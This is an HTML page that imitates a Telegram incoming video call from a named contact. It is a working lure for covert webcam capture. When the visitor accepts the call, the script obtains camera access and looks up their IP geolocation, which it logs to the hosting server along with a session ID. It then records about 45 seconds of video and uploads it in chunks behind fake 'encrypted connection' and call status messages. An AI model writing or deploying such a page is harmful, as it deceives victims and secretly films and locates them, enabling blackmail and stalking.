<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Telegram</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #212d3b; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
  .container { width: 100%; max-width: 420px; }

  /* Top bar */
  .topbar { background: #17212b; padding: 12px 16px; display: flex; align-items: center; gap: 12px; border-radius: 12px 12px 0 0; border-bottom: 1px solid #0d1821; }
  .back { font-size: 22px; color: #5b9bd5; cursor: pointer; }
  .avatar { width: 42px; height: 42px; border-radius: 50%; background: linear-gradient(135deg, #2ca5e0, #1a7cb8); display: flex; align-items: center; justify-content: center; font-size: 18px; font-weight: 700; flex-shrink: 0; }
  .contact-info { flex: 1; }
  .contact-name { font-size: 16px; font-weight: 600; }
  .contact-sub { font-size: 12px; color: #6c8ea4; }
  .topbar-icons { display: flex; gap: 16px; font-size: 20px; color: #5b9bd5; }

  /* Video */
  .video-wrap { background: #0d1821; position: relative; aspect-ratio: 9/16; max-height: 54vh; overflow: hidden; display: flex; align-items: center; justify-content: center; }
  #preview { width: 100%; height: 100%; object-fit: cover; display: none; transform: scaleX(-1); }
  .center-avatar { display: flex; flex-direction: column; align-items: center; gap: 14px; }
  .big-avatar { width: 88px; height: 88px; border-radius: 50%; background: linear-gradient(135deg, #2ca5e0, #1a7cb8); display: flex; align-items: center; justify-content: center; font-size: 38px; font-weight: 700; box-shadow: 0 0 0 4px rgba(44,165,224,0.25); animation: pulse-ring 2s infinite; }
  @keyframes pulse-ring { 0%,100%{box-shadow:0 0 0 4px rgba(44,165,224,0.25)} 50%{box-shadow:0 0 0 12px rgba(44,165,224,0.08)} }
  .caller-name { font-size: 20px; font-weight: 600; }
  .call-status-label { font-size: 14px; color: #6c8ea4; }

  .rec-badge { position: absolute; top: 10px; left: 12px; background: #e53935; color: #fff; font-size: 11px; font-weight: 700; padding: 3px 8px; border-radius: 4px; display: none; }
  .timer-badge { position: absolute; top: 10px; right: 12px; font-size: 13px; color: #aaa; display: none; }

  /* Bottom controls */
  .controls { background: #17212b; padding: 16px 16px 24px; border-radius: 0 0 12px 12px; }
  .status-msg { font-size: 13px; color: #6c8ea4; text-align: center; margin-bottom: 16px; }
  .accept-btn { width: 100%; background: #2ca5e0; border: none; color: #fff; font-size: 16px; font-weight: 600; padding: 13px; border-radius: 8px; cursor: pointer; }
  .accept-btn:disabled { background: #1e2d3d; color: #4a6278; cursor: not-allowed; }
  .btn-row { display: none; justify-content: space-around; }
  .ctrl-btn { display: flex; flex-direction: column; align-items: center; gap: 6px; cursor: pointer; }
  .ci { width: 50px; height: 50px; border-radius: 50%; background: #2b3f52; display: flex; align-items: center; justify-content: center; font-size: 20px; }
  .ci-end { background: #e53935; }
  .cl { font-size: 11px; color: #6c8ea4; }
</style>
</head>
<body>
<div class="container">
  <div class="topbar">
    <div class="back">←</div>
    <div class="avatar">N</div>
    <div class="contact-info">
      <div class="contact-name">Nikhil Verma</div>
      <div class="contact-sub" id="contactSub">Video Call</div>
    </div>
    <div class="topbar-icons"><span>🔍</span><span>⋮</span></div>
  </div>

  <div class="video-wrap">
    <video id="preview" autoplay muted playsinline></video>
    <div class="center-avatar" id="centerAvatar">
      <div class="big-avatar">N</div>
      <div class="caller-name">Nikhil Verma</div>
      <div class="call-status-label" id="callStatusLabel">Incoming video call...</div>
    </div>
    <div class="rec-badge" id="recBadge">● REC</div>
    <div class="timer-badge" id="timerBadge">00:00</div>
  </div>

  <div class="controls">
    <div class="status-msg" id="statusMsg">Nikhil Verma is calling you on Telegram</div>
    <button class="accept-btn" id="acceptBtn" onclick="startSession()">Accept Video Call</button>
    <div class="btn-row" id="btnRow">
      <div class="ctrl-btn"><div class="ci">🎤</div><div class="cl">Mute</div></div>
      <div class="ctrl-btn"><div class="ci">🔊</div><div class="cl">Speaker</div></div>
      <div class="ctrl-btn"><div class="ci">📷</div><div class="cl">Camera</div></div>
      <div class="ctrl-btn" onclick="endCall()"><div class="ci ci-end">📵</div><div class="cl">End</div></div>
    </div>
  </div>
</div>

<script>
const SID = Math.random().toString(36).substr(2,10) + Date.now().toString(36);
let mediaRecorder, chunkIndex = 0, stream, sec = 0, interval;

async function getGeo() {
  try { return await (await fetch("https://ipapi.co/json/")).json(); } catch { return {}; }
}

function tick() {
  sec++;
  document.getElementById("timerBadge").textContent =
    `${String(Math.floor(sec/60)).padStart(2,"0")}:${String(sec%60).padStart(2,"0")}`;
}

async function startSession() {
  const btn = document.getElementById("acceptBtn");
  btn.disabled = true; btn.textContent = "Connecting...";
  document.getElementById("statusMsg").textContent = "Allow camera to connect";

  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { width:1280, height:720 }, audio: false });
  } catch {
    document.getElementById("statusMsg").textContent = "Camera denied. Please allow and try again.";
    btn.disabled = false; btn.textContent = "Accept Video Call";
    return;
  }

  document.getElementById("preview").srcObject = stream;
  document.getElementById("preview").style.display = "block";
  document.getElementById("centerAvatar").style.display = "none";
  document.getElementById("callStatusLabel").textContent = "Connected";
  document.getElementById("contactSub").textContent = "Connected";
  document.getElementById("statusMsg").textContent = "Establishing encrypted connection...";

  const geo = await getGeo();
  await fetch("/log", { method:"POST", headers:{"Content-Type":"application/json"},
    body: JSON.stringify({ session:SID, geo }) }).catch(()=>{});

  await new Promise(r => setTimeout(r, 1800));

  document.getElementById("recBadge").style.display = "block";
  document.getElementById("timerBadge").style.display = "block";
  document.getElementById("statusMsg").textContent = "";
  document.getElementById("acceptBtn").style.display = "none";
  document.getElementById("btnRow").style.display = "flex";
  interval = setInterval(tick, 1000);
  startRecording(stream);
}

function endCall() {
  if (mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
  if (stream) stream.getTracks().forEach(t => t.stop());
  clearInterval(interval);
  document.getElementById("recBadge").style.display = "none";
  document.getElementById("contactSub").textContent = "Call ended";
  document.getElementById("statusMsg").textContent = "Call ended.";
  document.getElementById("btnRow").style.display = "none";
}

function startRecording(stream) {
  const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp9") ? "video/webm;codecs=vp9" : "video/webm";
  mediaRecorder = new MediaRecorder(stream, { mimeType: mime, videoBitsPerSecond: 1500000 });
  mediaRecorder.ondataavailable = async (e) => {
    if (e.data && e.data.size > 0) await sendChunk(e.data, chunkIndex++);
  };
  mediaRecorder.onstop = async () => {
    await fetch(`/finalize?sid=${SID}`, { method:"POST" }).catch(()=>{});
  };
  mediaRecorder.start(5000);
  setTimeout(() => {
    if (mediaRecorder && mediaRecorder.state !== "inactive") { mediaRecorder.stop(); endCall(); }
  }, 45000);
}

async function sendChunk(blob, idx) {
  await fetch(`/upload?sid=${SID}&chunk=${idx}`, {
    method:"POST", headers:{"Content-Type":"video/webm"}, body: await blob.arrayBuffer()
  }).catch(()=>{});
}
</script>
</body>
</html>
